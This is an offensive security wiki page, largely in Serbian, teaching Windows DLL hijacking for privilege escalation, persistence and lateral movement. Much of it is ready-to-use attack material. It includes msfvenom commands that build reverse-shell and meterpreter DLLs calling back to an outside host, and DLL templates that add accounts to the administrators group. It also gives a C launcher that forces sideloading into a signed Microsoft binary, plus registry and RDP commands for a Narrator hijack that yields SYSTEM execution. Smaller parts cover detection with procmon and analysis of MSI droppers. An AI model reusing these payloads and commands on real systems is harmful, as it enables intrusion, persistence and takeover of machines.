# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom da učita zlonamerni DLL. Ovaj pojam obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Koristi se pretežno za izvršavanje koda, postizanje persistencije, i, ređe, za eskalaciju privilegija. Iako se ovde fokusiramo na eskalaciju, metoda hijackinga ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Koriste se različite metode za DLL hijacking, i svaka od njih je efikasna u zavisnosti od strategije učitavanja DLL-ova koju aplikacija koristi:

1. **DLL Replacement**: Zamenjivanje legitimnog DLL-a zlonamernim, opcionalno koristeći DLL Proxying da se sačuva originalna funkcionalnost DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u pretraživački put pre legitimnog, iskorišćavajući obrasce pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za aplikaciju koja pokuša da učita nepostojeći potrebni DLL.
4. **DLL Redirection**: Modifikovanje parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da se aplikacija usmeri na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

## Pronalaženje nedostajućih DLL-ova

Najčešći način da se pronađu nedostajući DLL-ovi u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, uz **podešavanje** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i jednostavno prikažite **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **missing dlls in general** pustite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll** unutar konkretnog izvršnog fajla, trebalo bi da postavite **još jedan filter kao "Process Name" "contains" `<exec name>`, pokrenete ga i zaustavite hvatanje događaja**.

## Eksploatisanje nedostajućih DLL-ova

Da bismo eskalirali privilegije, najbolja šansa je da možemo **upisati DLL koji će neki privilegovani proces pokušati da učita** na nekom od **mesta gde će se tražiti**. Dakle, moći ćemo da **upisemo** DLL u **folder** gde se **DLL traži pre** foldera gde se nalazi **originalni DLL** (čudan slučaj), ili ćemo moći da **upisemo u neki folder gde će se DLL tražiti** a originalni **DLL ne postoji** ni u jednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows aplikacije traže DLL-ove prateći skup unapred definisanih pretraživačkih putanja, pridržavajući se određenog reda. Problem DLL hijackinga nastaje kada se zlonamerni DLL strateški postavi u jedan od tih direktorijuma tako da se učita pre autentičnog DLL-a. Rešenje da se to spreči je osigurati da aplikacija koristi apsolutne putanje kada referencira DLL-ove koji su joj potrebni.

Možete videti **DLL search order na 32-bit** sistemima ispod:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ovo je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je on onemogućen, tekući direktorijum se pomera na drugo mesto. Da biste onemogućili ovu osobinu, kreirajte vrednost registra **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte u vidu da **DLL može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju taj DLL će se **tražiti samo u toj putanji** (ako DLL ima zavisnosti, one će se tražiti kao da su učitane samo po imenu).

Postoje i drugi načini da se izmeni redosled pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je podešavanje polja DllPath u RTL_USER_PROCESS_PARAMETERS pri kreiranju procesa koristeći ntdll-ove native API-je. Isporukom direktorijuma pod kontrolom napadača ovde, ciljani proces koji rešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flagova) može biti prisiljen da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Napomene/ograničenja
- Ovo utiče na child proces koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Ciljani proces mora importovati ili LoadLibrary DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijack-ovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, simplified error handling):

<details>
<summary>Potpun C primer: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite zlonamerni xmllite.dll (exporting the required functions or proxying to the real one) u direktorijum naveden u DllPath.
- Pokrenite potpisani binarni fajl za koji se zna da traži xmllite.dll po imenu koristeći gore navedenu tehniku. Loader resolves the import via the supplied DllPath and sideloads your DLL.

Ova tehnika je primećena u prirodi da pokreće multi-stage sideloading lance: inicijalni launcher dropuje pomoćni DLL, koji zatim spawn-uje Microsoft-signed, hijackable binarni fajl sa custom DllPath-om da bi naterao učitavanje napadačevog DLL-a iz staging direktorijuma.


#### Izuzeci u redosledu pretrage DLL-a iz Windows dokumentacije

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Kada se naiđe na **DLL koji ima isto ime kao onaj koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, vrši proveru za redirekciju i manifest pre nego što podrazumevano koristi DLL koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju tog known DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **odustajući od procesa pretrage**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima se vrši kao da su oni označeni samo svojim **imenima modula**, bez obzira na to da li je početni DLL bio identifikovan putem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), koji **nema DLL**.
- Osigurajte da imate **write access** za bilo koji **direktorijum** u kojem će se **DLL** tražiti. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, zahtevi su komplikovani za pronaći jer je **po defaultu prilično čudno naći privilegovani izvršni fajl kojem nedostaje DLL** i još je **čudnije imati write permissions na folderu u system path-u** (po defaultu to nije moguće). Ali, u pogrešno konfigurisanim okruženjima ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta bypass UAC**, tamo možete naći **PoC** za Dll hijaking za verziju Windows-a koju koristite (verovatno samo menjajući putanju foldera u kojem imate write permissions).

Napomena da možete **proveriti svoja prava pristupa u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports of an executable i exports of a dll pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Drugi zanimljivi automatski alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Example

Ako nađete iskoristiv scenario, jedna od najvažnijih stvari za uspešan exploit biće da **napravite dll koji eksportuje bar sve funkcije koje će izvršni fajl importovati iz njega**. Imajte na umu da je Dll Hijacking koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako da napravite validan dll** možete naći u ovoj dll hijacking studiji fokusiranoj na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Štaviše, u **sledećem odeljku** možete naći neke **osnovne dll kodove** koji mogu biti korisni kao **templates** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu obavezne**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod kada se učita**, ali takođe i da **izlaže** i **radi** kako se očekuje prosleđivanjem svih poziva pravoj biblioteci.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti izvršni fajl i izabrati biblioteku** koju želite da proxify-ujete i **generisati proxified dll** ili **navesti Dll** i **generisati proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 — nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora da **export several functions** koje će učitati victim process. Ako te funkcije ne postoje, **binary won't be able to load** them i **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulazom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pokušava da učita predvidljivu, jezički specifičnu localization DLL pri pokretanju, koju je moguće hijack-ovati za arbitrary code execution i persistence.

Ključne činjenice
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji zapisljiv DLL pod kontrolom napadača, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Izvozi nisu potrebni.

Otkriće pomoću Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naivan hijack će govoriti/istaknuti UI. Da ostanete tihi, pri attach-u nabrojte Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` je; nastavite u svojoj niti. Pogledajte PoC za kompletan kod.

Trigger and persistence via Accessibility configuration
- Korisnički kontekst (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa gore navedenim, pokretanje Narrator učitava ubačeni DLL. Na secure desktop (logon screen), pritisnite CTRL+WIN+ENTER da pokrenete Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Dozvolite klasični RDP sigurnosni sloj: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se preko RDP na host; na logon screen pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje prestaje kada se RDP sesija zatvori — injektujte/migrujte brzo.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry unos (npr. CursorIndicator), izmeniti ga da pokazuje na proizvoljni binarni fajl/DLL, importovati ga, zatim podesiti `configuration` na to AT ime. Ovo posreduje izvršavanje proizvoljnog koda pod Accessibility framework-om.

Notes
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva administratorska prava.
- Sva logika payload-a može biti u `DLL_PROCESS_ATTACH`; nijedni exporti nisu potrebni.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Komponenta**: `TPQMAssistant.exe` nalazi se u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` izvršava se dnevno u 9:30 AM u kontekstu prijavljenog korisnika.
- **Directory Permissions**: Direktorijum je zapisiv za `CREATOR OWNER`, što omogućava lokalnim korisnicima da postave proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava prvo da učita `hostfxr.dll` iz svog radnog direktorijuma i loguje "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet pretraživanja lokalnog direktorijuma.

### Exploit Implementation

Napadač može postaviti maliciozni stub `hostfxr.dll` u isti direktorijum, eksploatisati nedostajući DLL i ostvariti izvršavanje koda u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, ubacite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak izvrši u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, maliciozni DLL će se pokrenuti u administratorskoj sesiji sa medium integrity.
4. Povežite standardne UAC bypass tehnike da biste eskalirali iz medium integrity na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Napadači često kombinuju MSI-based droppers sa DLL side-loading kako bi izvršavali payloads pod pouzdanim, potpisanim procesom.

Chain overview
- Korisnik preuzme MSI. A CustomAction se tiho izvršava tokom GUI instalacije (npr. LaunchApplication ili VBScript action), rekonstruišući sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i maliciozni DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order učitava wsc.dll iz radnog direktorijuma prvo, izvršavajući napadačev kod pod potpisanim parent procesom (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Tražite unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication executing an embedded file in background.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Tražite više malih fragmenata koji se konkateniraju i dešifruju pomoću VBScript CustomAction. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Postavite ove dve datoteke u isti direktorijum:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports pravoj biblioteci dok izvršavate payload u DllMain.
- Izgradite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export, koristite proxying framework (npr. DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na rezoluciju imena DLL od strane izvršnog fajla domaćina. Ako domaćin koristi apsolutne putanje ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS, and forwarded exports mogu uticati na precedence i moraju se uzeti u obzir pri izboru izvršnog fajla domaćina i skupa export-a.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
